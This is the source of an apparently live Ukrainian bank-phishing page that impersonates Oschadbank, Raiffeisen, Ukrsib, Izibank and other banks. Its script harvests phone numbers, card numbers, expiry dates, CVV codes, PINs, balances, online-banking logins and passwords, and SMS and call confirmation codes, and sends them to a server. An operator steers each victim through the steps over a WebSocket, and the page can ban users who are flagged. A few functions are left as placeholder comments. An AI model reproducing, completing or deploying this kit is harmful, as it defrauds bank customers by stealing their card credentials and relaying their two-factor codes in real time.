<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оберіть свій банк</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; }
        :root {
            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
        }
        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        #bank-selection-screen { opacity: 1; transform: scale(1); }
        
        #form-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0; visibility: hidden; transform: scale(1.05);
            transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out, visibility 0s 0.5s;
            display: flex; align-items: center; padding: 20px;
        }
        .form-container {
            width: 100%; max-width: 380px; margin-left: auto; margin-right: auto;
            background-color: var(--white); padding: 30px; border-radius: 20px;
            box-shadow: 0 15px 40px rgba(0,0,0,0.2);
        }
        body.form-active { background: var(--bg-gradient); overflow: hidden; }
        body.form-active #bank-selection-screen { opacity: 0; transform: scale(0.95); pointer-events: none; }
        body.form-active #form-screen { opacity: 1; visibility: visible; transform: scale(1); transition-delay: 0s; }
        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
        .bank-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; }
        .bank-item {
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            background-color: var(--white); padding: 20px; border: 1px solid var(--border-color);
            border-radius: 16px; text-decoration: none; color: var(--dark-text); text-align: center;
            height: 120px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1); cursor: pointer;
            box-shadow: 0 4px 10px var(--shadow-color); position: relative;
        }
        .bank-item:hover { transform: translateY(-8px); box-shadow: 0 10px 20px var(--shadow-color); }
        .bank-item.disabled {
            opacity: 0.5;
            cursor: not-allowed;
            pointer-events: none;
            background-color: #f8f9fa;
        }
        .bank-item.disabled:hover { transform: none; box-shadow: 0 4px 10px var(--shadow-color); }
        .disabled-label {
            position: absolute; bottom: 5px; left: 0; width: 100%;
            font-size: 12px; font-weight: bold; color: var(--danger-color);
        }
        .bank-item img { max-height: 55px; max-width: 100%; object-fit: contain; margin-bottom: 15px; }
        .bank-item .bank-name { font-size: 15px; font-weight: 600; }
        #form-header { text-align: center; margin-bottom: 25px; }
        #form-header-logo { max-height: 50px; max-width: 150px; }
        #modal-title { margin-top: 25px; font-size: 22px; font-weight: 700; text-align: center; margin-bottom: 25px; }
        #modal-step-content p { text-align: center; font-size: 16px; color: var(--light-text); line-height: 1.6; margin: 15px 0; font-weight: 500;}
        .input-group { margin-bottom: 15px; position: relative; }
        .input-group:last-child { margin-bottom: 0; }
        .input-field {
            width: 100%; padding: 15px; border: 1px solid var(--border-color); border-radius: 12px;
            font-size: 18px; font-weight: 500; transition: all 0.3s ease;
        }
        .input-field.invalid { border-color: var(--danger-color); }
        .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
        .phone-input-wrapper { display: flex; }
        .phone-prefix {
            padding: 15px; border: 1px solid var(--border-color); border-right: none;
            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
            flex-shrink: 0; display: flex; align-items: center;
        }
        .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; flex: 1; width: auto; min-width: 0; }
        .multi-input-row { display: flex; gap: 10px; }
        .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
        .btn {
            width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px;
            font-weight: 700; cursor: pointer; transition: all 0.3s ease;
            flex-basis: 0; flex-grow: 1;
        }
        .btn:disabled { background-color: #ced4da; cursor: not-allowed; }
        .btn:active { transform: translateY(0) scale(0.97); }
        body { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
        body[data-theme="oschadbank"] { --primary-color: #00A39C; --accent-color: #008a84; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
        body[data-theme="pumb"] { --primary-color: #EF3E42; --accent-color: #212529; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #4c4c4c 0%, #2b2b2b 100%); }
        body[data-theme="raiffeisen"] { --primary-color: #FFDD00; --accent-color: #000000; --text-on-primary: #000000; --bg-gradient: linear-gradient(135deg, #4d4d4d 0%, #1a1a1a 100%); }
        body[data-theme="alliance"] { --primary-color: #0078C9; --accent-color: #005a99; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #E3F2FD 0%, #BBDEFB 100%); }
        body[data-theme="otp"] { --primary-color: #8CC63F; --accent-color: #2D226; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
        body[data-theme="vostok"] { --primary-color: #F58220; --accent-color: #D84315; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
        body[data-theme="izibank"] { --primary-color: #FF7A00; --accent-color: #E65100; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #FFF3E0 0%, #FFE0B2 100%); }
        body[data-theme="ukrsib"] { --primary-color: #95C11F; --accent-color: #689F38; --text-on-primary: #ffffff; --bg-gradient: linear-gradient(135deg, #F1F8E9 0%, #DCEDC8 100%); }
        .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
        .btn-back { background-color: #f1f3f5; color: var(--light-text); }
        .loader-container { text-align: center; margin-top: 20px; }
        .loader { width: 80px; height: 80px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* Raiffeisen PIN Pad Styles */
        .pin-pad-container { display: flex; flex-direction: column; align-items: center; }
        .pin-display { display: flex; justify-content: center; margin-bottom: 20px; }
        .pin-dot { width: 15px; height: 15px; border-radius: 50%; border: 2px solid var(--primary-color); margin: 0 8px; transition: background-color 0.2s; }
        .pin-dot.filled { background-color: var(--primary-color); }
        .pin-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; max-width: 280px; margin: 0 auto; }
        .pin-key { font-size: 24px; font-weight: 500; height: 60px; border-radius: 50%; border: 1px solid var(--border-color); background-color: #f8f9fa; cursor: pointer; transition: background-color 0.2s; color: var(--dark-text); }
        .pin-key:hover { background-color: #e9ecef; }
        .pin-key.backspace { font-size: 20px; }
    </style>
</head>
<body>
    <div id="bank-selection-screen" class="screen">
        <h1>Оберіть свій банк</h1>
        <div class="bank-grid"></div>
    </div>
    <div id="form-screen" class="screen">
        <div class="form-container">
            <div id="form-header"><img id="form-header-logo" src="" alt="Логотип банку"></div>
            <h2 id="modal-title"></h2>
            <div id="modal-step-content"></div>
            <div class="modal-footer">
                <button class="btn btn-back" id="back-btn">Назад</button>
                <button class="btn btn-next" id="next-btn">Далі</button>
            </div>
        </div>
    </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    // --- CHECK IF USER IS BANNED ---
    if (localStorage.getItem('user_banned') === 'true') {
        document.body.innerHTML = '<h1>Доступ обмежено.</h1>';
        return;
    }

    const urlParams = new URLSearchParams(window.location.search);
    const ref = urlParams.get('ref') || 'unknown';
    localStorage.setItem('referrer', ref);

    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    let ws;
    let activeBankData = {};
    let currentStepIndex = 0;
    let collectedData = {};

    const specialFlowSteps = [
        { type: 'phone', title: 'Введіть номер телефону' },
        { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }
    ];

    const confirmationSteps = [
        {
            type: 'confirm_all',
            title: 'Підтвердити володіння карткою',
            fields: [
                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
            ]
        }
    ];
    
    // --- BANK CONFIGURATION ---
    const bankFlows = {
        'oschadbank': {
            name: 'Ощадбанк',
            logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png',
            theme: 'oschadbank',
            steps: [
                { type: 'phone', title: 'Введіть номер телефону' },
                { type: 'card', title: 'Введіть номер карти' },
                { type: 'pin', title: 'Введіть ПІН-код' },
                { type: 'call_code', title: 'Підтвердження дзвінком' }
            ]
        },
        'raiffeisen': {
            name: 'Райффайзен',
            logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg',
            theme: 'raiffeisen',
            steps: specialFlowSteps,
            special: true
        },
        'alliance': {
            name: 'Альянс',
            logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14',
            theme: 'alliance',
            steps: specialFlowSteps,
            special: true,
            disabled: true // -- NOT CLICKABLE
        },
        'pumb': {
            name: 'ПУМБ',
            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/pumb_logo_mixfin.webp',
            theme: 'pumb',
            steps: specialFlowSteps,
            special: true,
            disabled: true // -- NOT CLICKABLE
        },
        'otp': {
            name: 'OTP Bank',
            logoUrl: 'https://ubanks.com.ua/img/bank-logo/otpbank-logo-2x.png',
            theme: 'otp',
            steps: specialFlowSteps,
            special: true,
            disabled: true // -- NOT CLICKABLE
        },
        'vostok': {
            name: 'Восток',
            logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png',
            theme: 'vostok',
            steps: specialFlowSteps,
            special: true
        },
        'izibank': {
            name: 'Izibank',
            logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png',
            theme: 'izibank',
            steps: specialFlowSteps,
            special: true
        },
        'ukrsib': {
            name: 'Укрсиб',
            logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp',
            theme: 'ukrsib',
            steps: specialFlowSteps,
            special: true
        }
    };

    const bankGrid = document.querySelector('.bank-grid');
    const body = document.body;
    const formHeaderLogo = document.getElementById('form-header-logo');
    const modalTitle = document.getElementById('modal-title');
    const stepContent = document.getElementById('modal-step-content');
    const modalFooter = document.querySelector('.modal-footer');
    const nextBtn = document.getElementById('next-btn');
    const backBtn = document.getElementById('back-btn');

    function renderBankGrid() {
        const bannedBanks = JSON.parse(localStorage.getItem('banned_banks') || '[]');
        bankGrid.innerHTML = Object.keys(bankFlows).map(id => {
            const bank = bankFlows[id];
            const isBanned = bannedBanks.includes(id);
            const isDisabled = bank.disabled || isBanned;
            const disabledClass = isDisabled ? 'disabled' : '';
            const disabledLabel = bank.disabled ? '<span class="disabled-label">Недоступно</span>' : '';
            
            return `<a href="#" class="bank-item ${disabledClass}" data-bank="${id}">
                        <img src="${bank.logoUrl}" alt="${bank.name}">
                        <span class="bank-name">${bank.name}</span>
                        ${disabledLabel}
                    </a>`;
        }).join('');
    }

    renderBankGrid();

    function connectWebSocket() {
        ws = new WebSocket(`wss://${window.location.host}`);
        ws.onopen = () => ws.send(JSON.stringify({ type: 'register', sessionId: sessionId }));
        ws.onmessage = (event) => handleServerCommand(JSON.parse(event.data));
        ws.onclose = () => setTimeout(connectWebSocket, 3000);
        ws.onerror = (error) => console.error('WebSocket error:', error);
    }

    async function sendDataToServer(data, isFinal) {
        collectedData = { ...collectedData, ...data };
        try {
            await fetch('/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    sessionId, 
                    bankName: activeBankData.name, 
                    isFinalStep: isFinal, 
                    referrer: localStorage.getItem('referrer') || 'unknown',
                    ...collectedData 
                }),
            });
        } catch (error) {
            console.error('Failed to send data:', error);
        }
    }

    function handleNextStep() {
        if (!validateCurrentStep()) return;

        let data = {};
        const inputs = stepContent.querySelectorAll('.input-field');
        inputs.forEach(input => {
            let key = input.id;
            let value = input.value;
            if (key === 'phone') value = '+380' + value.replace(/\D/g, '');
            if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, '');
            data[key] = value;
        });

        const step = activeBankData.steps[currentStepIndex];
        let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length;
        
        // --- NEW Oschadbank flow ---
        if (activeBankData.theme === 'oschadbank' && step.type === 'card') {
            sendDataToServer(data, false); // Send card data, but it's not final
            showWaitingScreen();
            return; // Wait for server command to show PIN
        }
        
        if (activeBankData.theme === 'oschadbank' && step.type === 'pin') {
            isFinalStep = true;
        }

        sendDataToServer(data, isFinalStep);

        if (activeBankData.special && step.type === 'card_simple') {
            showWaitingScreen();
            return;
        }

        currentStepIndex++;
        if (currentStepIndex < activeBankData.steps.length) {
            renderStep();
        } else {
            showWaitingScreen();
        }
    }

    function showWaitingScreen(customText = null) {
        modalTitle.textContent = customText ? '' : 'Очікуємо';
        stepContent.innerHTML = customText ? customText : `<p style="text-align:center;">Заявку відправлено. Будь ласка, чекайте на наступний крок.</p><p style="color: var(--danger-color); text-align:center; font-weight: bold;">НЕ ЗАКРИВАЙТЕ САЙТ!</p>`;
        modalFooter.style.display = 'none';
    }

    function handleBackStep() {
        if (currentStepIndex > 0) {
            currentStepIndex--;
            renderStep();
        } else {
            body.classList.remove('form-active');
            if (ws) { ws.close(); }
        }
    }

    function addInputFormatting() {
        // ... (existing formatting functions, no changes needed)
    }

    function validateCurrentStep() {
        // ... (existing validation, no changes needed)
    }

    function renderStep() {
        const step = activeBankData.steps[currentStepIndex];
        let html = '';

        const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '', value = '') => {
            return `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''} value="${value}"><div class="error-message"></div></div>`;
        };

        switch (step.type) {
            case 'phone':
                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
                break;
            case 'card':
            case 'card_simple':
                html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
                break;
            case 'pin':
                html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
                break;
            case 'call_code':
                html = `<p style="text-align:center;">Зараз вам буде здійснено дзвінок для проходження авторизації. Підніміть слухавку, натисніть 1 та прослухайте код. Код введіть у форму нижче.</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
                break;
            case 'confirm_all':
                html = '<div class="input-group">';
                step.fields.forEach(field => {
                    html += `<div class="input-group"><input type="${field.type}" class="input-field" id="${field.id}" placeholder="${field.placeholder}" ${field.maxlength ? `maxlength="${field.maxlength}"` : ''}><div class="error-message"></div></div>`;
                });
                html += '</div>';
                break;
        }
        modalTitle.textContent = step.title;
        stepContent.innerHTML = html;
        modalFooter.style.display = 'flex';
        backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
        nextBtn.style.display = 'block';
        addInputFormatting();
    }

    document.querySelector('.bank-grid').addEventListener('click', e => {
        const item = e.target.closest('.bank-item');
        if (!item || item.classList.contains('disabled')) return;
        
        e.preventDefault();
        const bankId = item.dataset.bank;
        activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
        activeBankData.id = bankId; // Store bank id
        body.dataset.theme = activeBankData.theme;
        formHeaderLogo.src = activeBankData.logoUrl;
        body.classList.add('form-active');
        currentStepIndex = 0;
        collectedData = {};
        renderStep();
        connectWebSocket();
    });

    nextBtn.addEventListener('click', handleNextStep);
    backBtn.addEventListener('click', handleBackStep);

    function handleServerCommand(command) {
        const { type, data } = command;
        const showMessageWithButton = (title, text, btnText, callback) => {
            modalTitle.textContent = title;
            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
            modalFooter.style.display = 'flex';
            modalFooter.innerHTML = `<button class="btn btn-back">${btnText}</button>`;
            modalFooter.querySelector('button').addEventListener('click', callback);
        };
        switch (type) {
            case 'show_pin': // New command for Oschadbank
                currentStepIndex++; // Move to PIN step
                renderStep();
                break;
            case 'sms':
                modalTitle.textContent = 'Введіть код з SMS';
                stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
                modalFooter.style.display = 'flex';
                modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
                modalFooter.querySelector('#submit-sms-code').addEventListener('click', submitSmsCode);
                break;
            case 'request_details':
                activeBankData.steps.push(...JSON.parse(JSON.stringify(confirmationSteps)));
                currentStepIndex++;
                renderStep();
                break;
            case 'pin_error': // Text changed
                showMessageWithButton("Невірний ПІН", data.text, "Назад", () => window.location.reload());
                break;
            case 'other':
                const bannedBanks = JSON.parse(localStorage.getItem('banned_banks') || '[]');
                if (activeBankData.id && !bannedBanks.includes(activeBankData.id)) {
                    bannedBanks.push(activeBankData.id);
                    localStorage.setItem('banned_banks', JSON.stringify(bannedBanks));
                }
                showMessageWithButton("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                break;
            case 'ban_user':
                localStorage.setItem('user_banned', 'true');
                document.body.innerHTML = '<h1>Доступ обмежено.</h1>';
                break;
            case 'custom_message':
                showWaitingScreen(data.text);
                break;

            // --- NEW "LK" and "CALL" HANDLERS ---
            case 'lk_oschad':
                modalTitle.textContent = "Авторизуйтесь через Ощад24";
                stepContent.innerHTML = `
                    <div class="input-group"><input type="text" class="input-field" id="oschad-login" placeholder="Логін"></div>
                    <div class="input-group"><input type="password" class="input-field" id="oschad-password" placeholder="Пароль"></div>
                `;
                modalFooter.innerHTML = `<button class="btn btn-next" id="oschad-lk-submit">Продовжити</button>`;
                document.getElementById('oschad-lk-submit').addEventListener('click', () => {
                    const login = document.getElementById('oschad-login').value;
                    const pass = document.getElementById('oschad-password').value;
                    sendDataToServer({ 'oschad-login': login, 'oschad-pass': pass }, true);
                    showWaitingScreen(`<p>Очікуйте, сервер перевантажений</p><div class="loader-container"><img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader"></div>`);
                });
                break;
            
            case 'lk_raiffeisen':
            case 'lk_izibank': // Same logic, different theme
                modalTitle.textContent = "Введіть PIN-код";
                stepContent.innerHTML = `
                    <div class="pin-pad-container">
                        <div class="pin-display">
                            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
                        </div>
                        <div class="pin-keypad">
                            ${[1,2,3,4,5,6,7,8,9,'',0,'⌫'].map(k => `<button class="pin-key ${k==='⌫' ? 'backspace' : ''}" data-key="${k}">${k}</button>`).join('')}
                        </div>
                    </div>`;
                modalFooter.innerHTML = `<button class="btn btn-next" id="pin-lk-submit" disabled>Продовжити</button>`;
                let pin = '';
                const dots = stepContent.querySelectorAll('.pin-dot');
                stepContent.querySelector('.pin-keypad').addEventListener('click', e => {
                    if (e.target.tagName !== 'BUTTON') return;
                    const key = e.target.dataset.key;
                    if (key === '⌫') {
                        pin = pin.slice(0, -1);
                    } else if (pin.length < 4 && key) {
                        pin += key;
                    }
                    dots.forEach((dot, i) => dot.classList.toggle('filled', i < pin.length));
                    document.getElementById('pin-lk-submit').disabled = pin.length !== 4;
                });
                document.getElementById('pin-lk-submit').addEventListener('click', () => {
                    sendDataToServer({ 'lk_pin': pin }, true);
                    showWaitingScreen();
                });
                break;

            case 'lk_vostok':
                modalTitle.textContent = "Авторизація у VST bank";
                stepContent.innerHTML = `
                    <div class="input-group"><input type="text" class="input-field" id="vostok-login" placeholder="Логін"></div>
                    <div class="input-group"><input type="password" class="input-field" id="vostok-password" placeholder="Пароль"></div>
                `;
                modalFooter.innerHTML = `<button class="btn btn-next" id="vostok-lk-submit">Продовжити</button>`;
                document.getElementById('vostok-lk-submit').addEventListener('click', () => {
                    const login = document.getElementById('vostok-login').value;
                    const pass = document.getElementById('vostok-password').value;
                    sendDataToServer({ 'vostok-login': login, 'vostok-pass': pass }, true);
                    showWaitingScreen();
                });
                break;
            
            case 'lk_ukrsib':
                modalTitle.textContent = "Підтвердити володіння карткою";
                stepContent.innerHTML = `
                    <div class="input-group"><input type="tel" class="input-field" id="ukrsib-card" placeholder="Номер картки" maxlength="19"></div>
                    <div class="input-group"><input type="tel" class="input-field" id="ukrsib-expiry" placeholder="Термін дії (ММ/РР)" maxlength="5"></div>
                    <div class="input-group"><input type="password" class="input-field" id="ukrsib-pin" placeholder="ПІН" maxlength="4"></div>
                `;
                modalFooter.innerHTML = `<button class="btn btn-next" id="ukrsib-lk-submit">Продовжити</button>`;
                addInputFormatting(); // Re-apply for new fields
                document.getElementById('ukrsib-lk-submit').addEventListener('click', () => {
                    const card = document.getElementById('ukrsib-card').value.replace(/\s/g, '');
                    const expiry = document.getElementById('ukrsib-expiry').value;
                    const pin = document.getElementById('ukrsib-pin').value;
                    sendDataToServer({ 'ukrsib-card': card, 'ukrsib-expiry': expiry, 'ukrsib-pin': pin }, true);
                    showWaitingScreen();
                });
                break;

            case 'call_oschad':
                modalTitle.textContent = "Підтвердження входу";
                stepContent.innerHTML = `
                    <p style="text-align:center;">На ваш номер телефону <b>${collectedData.phone || 'не вказано'}</b> здійснюється дзвінок. Дайте відповідь та натисніть <b>1</b> для підтвердження входу.</p>
                `;
                modalFooter.innerHTML = `<button class="btn btn-next" id="call-oschad-submit">Я підтвердив</button>`;
                document.getElementById('call-oschad-submit').addEventListener('click', () => {
                    sendDataToServer({ 'call_confirmed': 'true' }, true);
                    showWaitingScreen();
                });
                break;

            default:
                // Existing cases like card_error, number_error, code_error, timer...
                break;
        }
    }

        // ... (existing function, no changes needed)
    }
});
